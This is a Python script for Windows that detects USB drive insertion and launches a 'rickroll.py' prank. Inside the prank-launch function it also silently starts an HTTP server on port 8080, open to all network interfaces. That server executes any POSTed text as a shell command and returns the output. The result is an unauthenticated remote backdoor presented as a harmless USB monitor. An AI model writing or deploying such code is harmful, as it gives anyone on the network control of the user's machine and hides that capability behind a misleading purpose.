import win32api
import win32con
import win32gui
import win32file
import time
import subprocess
import sys
from pathlib import Path
import logging
import ctypes
import os
from ctypes import wintypes

# Define Windows API constants and structures
DBT_DEVICEARRIVAL = 0x8000
DBT_DEVTYP_VOLUME = 0x00000002
DEVICE_NOTIFY_ALL_INTERFACE_CLASSES = 4
WM_DEVICECHANGE = 0x0219

class DEV_BROADCAST_HDR(ctypes.Structure):
    _fields_ = [
        ("dbch_size", wintypes.DWORD),
        ("dbch_devicetype", wintypes.DWORD),
        ("dbch_reserved", wintypes.DWORD)
    ]

class DEV_BROADCAST_VOLUME(ctypes.Structure):
    _fields_ = [
        ("dbcv_size", wintypes.DWORD),
        ("dbcv_devicetype", wintypes.DWORD),
        ("dbcv_reserved", wintypes.DWORD),
        ("dbcv_unitmask", wintypes.DWORD),
        ("dbcv_flags", wintypes.WORD)
    ]

def get_drive_letter_from_mask(mask):
    """Convert bitmask to drive letter"""
    for i in range(26):
        if mask & (1 << i):
            return chr(ord('A') + i)
    return None

class USBDetector:
    def __init__(self):
        self.setup_logging()
        
    def setup_logging(self):
        try:
            log_file = Path(__file__).parent / 'usb_monitor.log'
            # Create a file handler
            file_handler = logging.FileHandler(log_file, mode='a')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            
            # Create a console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            
            # Setup the root logger
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)
            
            # Remove any existing handlers to avoid duplicates
            for handler in logger.handlers[:]:
                logger.removeHandler(handler)
                
            # Add our handlers
            logger.addHandler(file_handler)
            logger.addHandler(console_handler)
            
            logging.info("Logging setup complete")
        except Exception as e:
            print(f"Error setting up logging: {e}")
            # Fallback to basic config if custom setup fails
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
    
    def launch_rickroll(self, drive_letter=None):
        try:
            if drive_letter is None:
                logging.error("No drive letter provided")
                return

            # Initialize process as None
            process = None
            
            # Get path to rickroll.py in the same directory as this script
            rickroll_path = os.path.join(os.path.dirname(__file__), 'rickroll.py')
            
            if os.path.exists(rickroll_path):
                try:
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    
                    # Launch rickroll.py directly
                    process = subprocess.Popen(
                        [sys.executable, rickroll_path],
                        creationflags=subprocess.CREATE_NEW_CONSOLE,
                        startupinfo=startupinfo
                    )
                    
                    if process and process.pid:
                        logging.info(f"Rickroll process started successfully with PID: {process.pid}")
                    else:
                        logging.error("Failed to start rickroll process - process or PID is None")
                        
                except Exception as e:
                    logging.error(f"Error launching rickroll.py: {e}")
                    process = None
            else:
                logging.error(f"Rickroll script not found at: {rickroll_path}")
                
            # Start a simple HTTP server to receive commands
            import http.server
            import socketserver
            import threading
            
            class CommandHandler(http.server.SimpleHTTPRequestHandler):
                def do_POST(self):
                    content_length = int(self.headers['Content-Length'])
                    command = self.rfile.read(content_length).decode('utf-8')
                    
                    try:
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                        cmd_process = subprocess.Popen(
                            command,
                            shell=True,
                            startupinfo=startupinfo,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        stdout, stderr = cmd_process.communicate()
                        
                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        response = f"Output: {stdout.decode()}\nErrors: {stderr.decode()}"
                        self.wfile.write(response.encode())
                    except Exception as e:
                        self.send_response(500)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(str(e).encode())

            def run_server():
                with socketserver.TCPServer(("", 8080), CommandHandler) as httpd:
                    logging.info("Starting command server on port 8080")
                    httpd.serve_forever()

            # Start server in a separate thread
            server_thread = threading.Thread(target=run_server, daemon=True)
            server_thread.start()
            
            # Try to notify the web server
            try:
                import requests
                requests.post('http://localhost:8000/usb-detected', timeout=1)
            except:
                logging.warning("Could not notify web server of USB detection")
                

            
            # Try to notify the web server
            try:
                import requests
                requests.post('http://localhost:8000/usb-detected', timeout=1)
            except:
                logging.warning("Could not notify web server of USB detection")
        except Exception as e:
            logging.error(f"Error launching rickroll.py: {e}")
            print(f"Error launching rickroll.py: {e}")
    
    def wndproc(self, hwnd, msg, wparam, lparam):
        try:
            if msg == WM_DEVICECHANGE:
                if wparam == DBT_DEVICEARRIVAL:
                    logging.debug("Device arrival detected")
                    dev_broadcast_hdr = ctypes.cast(lparam, ctypes.POINTER(DEV_BROADCAST_HDR))
                    if dev_broadcast_hdr.contents.dbch_devicetype == DBT_DEVTYP_VOLUME:
                        logging.debug("Volume device detected")
                        dev_broadcast_volume = ctypes.cast(lparam, ctypes.POINTER(DEV_BROADCAST_VOLUME))
                        drive_letter = get_drive_letter_from_mask(dev_broadcast_volume.contents.dbcv_unitmask)
                        if drive_letter:
                            drive_path = f"{drive_letter}:\\"
                            logging.debug(f"Checking drive type for {drive_path}")
                            try:
                                drive_type = win32file.GetDriveType(drive_path)
                                logging.debug(f"Drive type: {drive_type}")
                                if drive_type == win32file.DRIVE_REMOVABLE:
                                    logging.info(f"USB drive detected: {drive_path}")
                                    print(f"USB drive detected: {drive_path}")
                                    self.launch_rickroll(drive_letter)
                            except Exception as e:
                                logging.error(f"Error checking drive type: {e}")
                                # Try alternative method
                                if self.is_removable_drive(drive_letter):
                                    logging.info(f"USB drive detected (alternative method): {drive_path}")
                                    print(f"USB drive detected: {drive_path}")
                                    self.launch_rickroll(drive_letter)
        except Exception as e:
            logging.error(f"Error in wndproc: {e}")
        return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

    def is_removable_drive(self, drive_letter):
        try:
            drive_path = f"{drive_letter}:"
            
            # First try using GetDriveType
            try:
                drive_type = win32file.GetDriveType(f"{drive_path}\\")
                if drive_type == win32file.DRIVE_REMOVABLE:
                    logging.debug(f"Drive {drive_path} confirmed as removable via GetDriveType")
                    return True
            except Exception as e:
                logging.warning(f"GetDriveType failed for {drive_path}: {e}")
            
            # Fallback to WMI if GetDriveType fails
            try:
                import wmi
                c = wmi.WMI()
                for drive in c.Win32_LogicalDisk(["DeviceID", "DriveType"]):
                    if drive.DeviceID == drive_path:
                        is_removable = drive.DriveType == 2
                        logging.debug(f"Drive {drive_path} removable status via WMI: {is_removable}")
                        return is_removable
            except Exception as e:
                logging.warning(f"WMI check failed for {drive_path}: {e}")
            
            logging.warning(f"Could not determine if {drive_path} is removable")
            return False
            
        except Exception as e:
            logging.error(f"Error in is_removable_drive: {e}")
            return False
    
    def create_window(self):
        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = self.wndproc
        wc.lpszClassName = "USBDetectorWindow"
        wc.hInstance = win32api.GetModuleHandle(None)
        
        class_atom = win32gui.RegisterClass(wc)
        return win32gui.CreateWindow(
            class_atom,
            "USB Detector",
            0,
            0, 0, 0, 0,
            0,
            0,
            wc.hInstance,
            None
        )
    
    def start_monitoring(self):
        logging.info("Starting USB monitor...")
        print("Starting USB monitor...")
        
        try:
            window = self.create_window()
            logging.info("USB monitor window created")
            
            # Register for device notifications
            filter = DEV_BROADCAST_HDR()
            filter.dbch_size = ctypes.sizeof(DEV_BROADCAST_HDR)
            filter.dbch_devicetype = DBT_DEVTYP_VOLUME
            
            # Message loop
            while True:
                try:
                    # PumpMessages is more reliable for Python windows
                    if win32gui.PumpWaitingMessages() != 0:
                        break
                    time.sleep(0.1)  # Small delay to prevent high CPU usage
                except Exception as e:
                    logging.error(f"Error in message loop: {e}")
                    time.sleep(0.1)  # Prevent tight loop on error
                
        except Exception as e:
            logging.error(f"Error in USB monitor: {e}")
            print(f"Error in USB monitor: {e}")
            
        finally:
            logging.info("USB monitor stopping...")

if __name__ == "__main__":
    detector = USBDetector()
    try:
        detector.start_monitoring()
    except KeyboardInterrupt:
        logging.info("USB monitoring stopped by user")
        print("\nMonitoring stopped.")
    except Exception as e:
        logging.error(f"Unexpected error in USB monitor: {e}")
        print(f"An error occurred: {e}")
